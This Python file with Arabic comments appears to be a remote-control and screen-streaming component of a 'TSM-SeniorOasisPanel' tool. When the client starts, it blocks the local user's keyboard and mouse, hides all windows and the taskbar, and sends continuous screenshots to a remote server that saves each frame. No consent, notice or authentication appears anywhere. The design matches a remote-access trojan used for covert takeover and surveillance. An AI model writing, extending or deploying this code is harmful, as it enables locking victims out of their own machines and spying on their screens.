#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Enhanced VNC System
نظام VNC محسن للتحكم الكامل في الشاشة وإعادة توجيه الإدخالات
"""

import os
import sys
import time
import threading
import socket
import struct
import zlib
import base64
import json
import ctypes
from ctypes import wintypes
import win32api
import win32con
import win32gui
import win32process
import win32security
from PIL import Image, ImageGrab, ImageDraw, ImageFont
import io

class TSMEnhancedVNC:
    """نظام VNC محسن للتحكم الكامل"""
    
    def __init__(self, server_host='localhost', server_port=5001):
        self.server_host = server_host
        self.server_port = server_port
        self.vnc_socket = None
        self.connected = False
        self.screen_sharing = False
        self.frame_rate = 20  # FPS عالي للتحكم السلس
        self.quality = 90  # جودة عالية جداً
        self.screen_width = 1920
        self.screen_height = 1080
        self.input_blocked = False
        self.cursor_visible = True
        self.windows_hidden = False
        
        # إعدادات التحكم المتقدم
        self.mouse_sensitivity = 1.0
        self.keyboard_delay = 0.01
        self.click_delay = 0.01
        
    def connect_to_vnc_server(self):
        """الاتصال بخادم VNC المحسن"""
        try:
            self.vnc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.vnc_socket.settimeout(10)
            self.vnc_socket.connect((self.server_host, self.server_port))
            self.connected = True
            
            # إرسال معلومات النظام
            system_info = {
                'screen_width': self.screen_width,
                'screen_height': self.screen_height,
                'frame_rate': self.frame_rate,
                'quality': self.quality,
                'platform': os.name,
                'version': 'TSM-Enhanced-VNC-1.0'
            }
            
            info_data = json.dumps(system_info).encode('utf-8')
            self.vnc_socket.send(struct.pack('>I', len(info_data)))
            self.vnc_socket.send(info_data)
            
            print("TSM-SeniorOasisPanel: Enhanced VNC connection established")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Enhanced VNC connection failed: {e}")
            return False
    
    def disconnect_vnc(self):
        """قطع الاتصال مع VNC"""
        try:
            if self.vnc_socket:
                self.vnc_socket.close()
            self.connected = False
            self.screen_sharing = False
            self.restore_system_state()
            print("TSM-SeniorOasisPanel: Enhanced VNC disconnected")
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: VNC disconnect error: {e}")
    
    def capture_screen_enhanced(self):
        """التقاط الشاشة المحسن"""
        try:
            # التقاط الشاشة بجودة عالية
            screenshot = ImageGrab.grab()
            
            # ضبط الحجم للجودة المثلى
            screenshot = screenshot.resize((self.screen_width, self.screen_height), Image.Resampling.LANCZOS)
            
            # إضافة مؤشر الماوس إذا كان مرئياً
            if self.cursor_visible:
                screenshot = self._add_cursor_to_screenshot(screenshot)
            
            return screenshot
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Enhanced screen capture error: {e}")
            return None
    
    def _add_cursor_to_screenshot(self, screenshot):
        """إضافة مؤشر الماوس إلى لقطة الشاشة"""
        try:
            # الحصول على موقع الماوس
            cursor_pos = win32gui.GetCursorPos()
            x, y = cursor_pos
            
            # رسم مؤشر الماوس
            draw = ImageDraw.Draw(screenshot)
            
            # رسم مؤشر بسيط
            cursor_size = 10
            draw.polygon([
                (x, y),
                (x + cursor_size, y + cursor_size),
                (x + cursor_size//2, y + cursor_size//2),
                (x + cursor_size, y),
                (x, y)
            ], fill='white', outline='black')
            
            return screenshot
        except Exception as e:
            return screenshot
    
    def compress_image_enhanced(self, image):
        """ضغط الصورة المحسن"""
        try:
            if image.mode != 'RGB':
                image = image.convert('RGB')
            
            # ضغط JPEG بجودة عالية
            output = io.BytesIO()
            image.save(output, format='JPEG', quality=self.quality, optimize=True)
            compressed_data = output.getvalue()
            
            # ضغط إضافي مع zlib
            compressed_data = zlib.compress(compressed_data, 6)
            
            return compressed_data
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Enhanced image compression error: {e}")
            return None
    
    def send_screen_frame_enhanced(self, image_data):
        """إرسال إطار الشاشة المحسن"""
        try:
            if not self.connected or not self.vnc_socket:
                return False
            
            # إرسال رأس الإطار مع معلومات إضافية
            frame_info = {
                'timestamp': time.time(),
                'frame_rate': self.frame_rate,
                'quality': self.quality,
                'cursor_visible': self.cursor_visible,
                'input_blocked': self.input_blocked
            }
            
            info_data = json.dumps(frame_info).encode('utf-8')
            header = struct.pack('>II', len(info_data), len(image_data))
            
            self.vnc_socket.send(header)
            self.vnc_socket.send(info_data)
            self.vnc_socket.send(image_data)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Enhanced frame send error: {e}")
            return False
    
    def block_user_input(self):
        """حجب إدخالات المستخدم"""
        try:
            if not self.input_blocked:
                ctypes.windll.user32.BlockInput(True)
                self.input_blocked = True
                print("TSM-SeniorOasisPanel: User input blocked")
                return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Input blocking error: {e}")
            return False
    
    def unblock_user_input(self):
        """إلغاء حجب إدخالات المستخدم"""
        try:
            if self.input_blocked:
                ctypes.windll.user32.BlockInput(False)
                self.input_blocked = False
                print("TSM-SeniorOasisPanel: User input unblocked")
                return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Input unblocking error: {e}")
            return False
    
    def hide_all_windows(self):
        """إخفاء جميع النوافذ"""
        try:
            def enum_windows_callback(hwnd, windows):
                if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
                    windows.append(hwnd)
                return True
            
            windows = []
            win32gui.EnumWindows(enum_windows_callback, windows)
            
            for hwnd in windows:
                try:
                    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                except:
                    pass
            
            self.windows_hidden = True
            print("TSM-SeniorOasisPanel: All windows hidden")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Window hiding error: {e}")
            return False
    
    def show_all_windows(self):
        """إظهار جميع النوافذ"""
        try:
            def enum_windows_callback(hwnd, windows):
                if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
                    windows.append(hwnd)
                return True
            
            windows = []
            win32gui.EnumWindows(enum_windows_callback, windows)
            
            for hwnd in windows:
                try:
                    win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
                except:
                    pass
            
            self.windows_hidden = False
            print("TSM-SeniorOasisPanel: All windows shown")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Window showing error: {e}")
            return False
    
    def hide_taskbar(self):
        """إخفاء شريط المهام"""
        try:
            taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
            if taskbar:
                win32gui.ShowWindow(taskbar, win32con.SW_HIDE)
                print("TSM-SeniorOasisPanel: Taskbar hidden")
                return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Taskbar hide error: {e}")
            return False
    
    def show_taskbar(self):
        """إظهار شريط المهام"""
        try:
            taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
            if taskbar:
                win32gui.ShowWindow(taskbar, win32con.SW_SHOW)
                print("TSM-SeniorOasisPanel: Taskbar shown")
                return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Taskbar show error: {e}")
            return False
    
    def take_full_control(self):
        """السيطرة الكاملة على النظام"""
        try:
            # حجب إدخالات المستخدم
            self.block_user_input()
            
            # إخفاء جميع النوافذ
            self.hide_all_windows()
            
            # إخفاء شريط المهام
            self.hide_taskbar()
            
            print("TSM-SeniorOasisPanel: Full system control taken")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Full control error: {e}")
            return False
    
    def restore_system_state(self):
        """استعادة حالة النظام"""
        try:
            # إلغاء حجب الإدخالات
            self.unblock_user_input()
            
            # إظهار جميع النوافذ
            self.show_all_windows()
            
            # إظهار شريط المهام
            self.show_taskbar()
            
            print("TSM-SeniorOasisPanel: System state restored")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: System restore error: {e}")
            return False
    
    def send_mouse_event_enhanced(self, x, y, button, pressed, scroll=0):
        """إرسال أحداث الماوس المحسنة"""
        try:
            if not self.connected or not self.vnc_socket:
                return False
            
            # تحويل الإحداثيات
            screen_x = int(x * 65535 / self.screen_width)
            screen_y = int(y * 65535 / self.screen_height)
            
            # تنسيق حدث الماوس المحسن
            event_data = struct.pack('>BHHBBH', 1, screen_x, screen_y, button, 1 if pressed else 0, scroll)
            self.vnc_socket.send(event_data)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Enhanced mouse event error: {e}")
            return False
    
    def send_keyboard_event_enhanced(self, key_code, pressed, modifiers=0):
        """إرسال أحداث لوحة المفاتيح المحسنة"""
        try:
            if not self.connected or not self.vnc_socket:
                return False
            
            # تنسيق حدث لوحة المفاتيح المحسن
            event_data = struct.pack('>BHBH', 2, key_code, 1 if pressed else 0, modifiers)
            self.vnc_socket.send(event_data)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Enhanced keyboard event error: {e}")
            return False
    
    def simulate_mouse_click(self, x, y, button='left'):
        """محاكاة نقرة الماوس"""
        try:
            if not self.input_blocked:
                return False
            
            # تحويل الإحداثيات
            screen_x = int(x * 65535 / self.screen_width)
            screen_y = int(y * 65535 / self.screen_height)
            
            # محاكاة النقرة
            if button == 'left':
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, screen_x, screen_y, 0, 0)
                time.sleep(self.click_delay)
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, screen_x, screen_y, 0, 0)
            elif button == 'right':
                win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, screen_x, screen_y, 0, 0)
                time.sleep(self.click_delay)
                win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, screen_x, screen_y, 0, 0)
            elif button == 'middle':
                win32api.mouse_event(win32con.MOUSEEVENTF_MIDDLEDOWN, screen_x, screen_y, 0, 0)
                time.sleep(self.click_delay)
                win32api.mouse_event(win32con.MOUSEEVENTF_MIDDLEUP, screen_x, screen_y, 0, 0)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Mouse click simulation error: {e}")
            return False
    
    def simulate_key_press(self, key_code):
        """محاكاة ضغط مفتاح"""
        try:
            if not self.input_blocked:
                return False
            
            # محاكاة الضغط
            win32api.keybd_event(key_code, 0, 0, 0)
            time.sleep(self.keyboard_delay)
            win32api.keybd_event(key_code, 0, win32con.KEYEVENTF_KEYUP, 0)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Key press simulation error: {e}")
            return False
    
    def simulate_mouse_move(self, x, y):
        """محاكاة حركة الماوس"""
        try:
            if not self.input_blocked:
                return False
            
            # تحويل الإحداثيات
            screen_x = int(x * 65535 / self.screen_width)
            screen_y = int(y * 65535 / self.screen_height)
            
            # محاكاة الحركة
            win32api.mouse_event(win32con.MOUSEEVENTF_MOVE | win32con.MOUSEEVENTF_ABSOLUTE, 
                               screen_x, screen_y, 0, 0)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Mouse move simulation error: {e}")
            return False
    
    def start_enhanced_vnc(self):
        """بدء VNC المحسن"""
        if not self.connect_to_vnc_server():
            return False
        
        # السيطرة الكاملة على النظام
        self.take_full_control()
        
        # بدء مشاركة الشاشة
        self.screen_sharing = True
        print("TSM-SeniorOasisPanel: Enhanced VNC started - Full control active")
        
        # بدء حلقة مشاركة الشاشة
        sharing_thread = threading.Thread(target=self._enhanced_screen_sharing_loop, daemon=True)
        sharing_thread.start()
        
        return True
    
    def _enhanced_screen_sharing_loop(self):
        """حلقة مشاركة الشاشة المحسنة"""
        frame_delay = 1.0 / self.frame_rate
        
        while self.screen_sharing and self.connected:
            try:
                # التقاط الشاشة
                screenshot = self.capture_screen_enhanced()
                if screenshot is None:
                    time.sleep(frame_delay)
                    continue
                
                # ضغط الصورة
                compressed_data = self.compress_image_enhanced(screenshot)
                if compressed_data is None:
                    time.sleep(frame_delay)
                    continue
                
                # إرسال الإطار
                if not self.send_screen_frame_enhanced(compressed_data):
                    break
                
                time.sleep(frame_delay)
                
            except Exception as e:
                print(f"TSM-SeniorOasisPanel: Enhanced screen sharing error: {e}")
                time.sleep(frame_delay)
    
    def stop_enhanced_vnc(self):
        """إيقاف VNC المحسن"""
        self.screen_sharing = False
        self.restore_system_state()
        self.disconnect_vnc()
        print("TSM-SeniorOasisPanel: Enhanced VNC stopped")

class TSMEnhancedVNCServer:
    """خادم VNC المحسن"""
    
    def __init__(self, host='localhost', port=5001):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.running = False
        self.frame_count = 0
        
    def start_server(self):
        """بدء خادم VNC المحسن"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            print(f"TSM-SeniorOasisPanel: Enhanced VNC Server started on {self.host}:{self.port}")
            
            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    client_thread = threading.Thread(
                        target=self._handle_enhanced_vnc_client,
                        args=(client_socket, client_address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.error as e:
                    if self.running:
                        print(f"TSM-SeniorOasisPanel: Enhanced VNC Server error: {e}")
                    break
                    
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Enhanced VNC Server error: {e}")
        finally:
            self.stop_server()
    
    def _handle_enhanced_vnc_client(self, client_socket, client_address):
        """معالجة عميل VNC المحسن"""
        client_id = f"{client_address[0]}:{client_address[1]}"
        print(f"TSM-SeniorOasisPanel: Enhanced VNC Client {client_id} connected")
        
        try:
            # استقبال معلومات النظام
            info_length = struct.unpack('>I', client_socket.recv(4))[0]
            system_info = json.loads(client_socket.recv(info_length).decode('utf-8'))
            
            print(f"TSM-SeniorOasisPanel: Client system info: {system_info}")
            
            while True:
                # استقبال معلومات الإطار
                frame_header = client_socket.recv(8)
                if len(frame_header) < 8:
                    break
                
                info_length, data_length = struct.unpack('>II', frame_header)
                
                # استقبال معلومات الإطار
                frame_info = json.loads(client_socket.recv(info_length).decode('utf-8'))
                
                # استقبال بيانات الإطار
                frame_data = b''
                while len(frame_data) < data_length:
                    chunk = client_socket.recv(min(4096, data_length - len(frame_data)))
                    if not chunk:
                        break
                    frame_data += chunk
                
                if len(frame_data) == data_length:
                    # معالجة بيانات الإطار
                    self._process_enhanced_frame_data(frame_data, frame_info, client_id)
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Enhanced VNC Client {client_id} error: {e}")
        finally:
            client_socket.close()
            print(f"TSM-SeniorOasisPanel: Enhanced VNC Client {client_id} disconnected")
    
    def _process_enhanced_frame_data(self, frame_data, frame_info, client_id):
        """معالجة بيانات الإطار المحسنة"""
        try:
            # فك ضغط بيانات الإطار
            decompressed_data = zlib.decompress(frame_data)
            
            # تحويل إلى صورة
            image = Image.open(io.BytesIO(decompressed_data))
            
            # حفظ الإطار (للمراقبة)
            self.frame_count += 1
            timestamp = int(time.time())
            filename = f"enhanced_vnc_frame_{client_id}_{self.frame_count}_{timestamp}.jpg"
            image.save(filename)
            
            print(f"TSM-SeniorOasisPanel: Enhanced frame {self.frame_count} received from {client_id}")
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Enhanced frame processing error: {e}")
    
    def stop_server(self):
        """إيقاف خادم VNC المحسن"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        print("TSM-SeniorOasisPanel: Enhanced VNC Server stopped")

def main():
    """الدالة الرئيسية"""
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Server: python TSM_EnhancedVNC.py server [host] [port]")
        print("  Client: python TSM_EnhancedVNC.py client [host] [port]")
        sys.exit(1)
    
    mode = sys.argv[1].lower()
    
    if mode == 'server':
        host = sys.argv[2] if len(sys.argv) > 2 else 'localhost'
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 5001
        
        server = TSMEnhancedVNCServer(host=host, port=port)
        try:
            server.start_server()
        except KeyboardInterrupt:
            server.stop_server()
    
    elif mode == 'client':
        host = sys.argv[2] if len(sys.argv) > 2 else 'localhost'
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 5001
        
        vnc = TSMEnhancedVNC(server_host=host, server_port=port)
        try:
            if vnc.start_enhanced_vnc():
                print("TSM-SeniorOasisPanel: Enhanced VNC client running. Press Ctrl+C to stop.")
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            vnc.stop_enhanced_vnc()
    
    else:
        print("Invalid mode. Use 'server' or 'client'")
        sys.exit(1)

if __name__ == "__main__":
    main()
